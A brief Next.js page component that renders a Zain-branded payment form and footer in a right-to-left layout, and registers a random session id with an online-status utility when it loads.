"use client"
import ZainFooter from "@/components/footer";
import ZainPaymentForm from "@/components/zin-pay";
import { setupOnlineStatus } from "@/lib/utils";
import { useEffect } from "react";

const _id = Math.random().toString(36).replace("0.", "zain-")

export default function Home() {
  useEffect(()=>{
    setupOnlineStatus(_id)
  },[])
  return (
    <div dir="rtl" className="min-h-screen flex flex-col">
      <main className="flex-grow" dir="rtl">
        <ZainPaymentForm />
      </main>
      <ZainFooter />
    </div>
  )
}
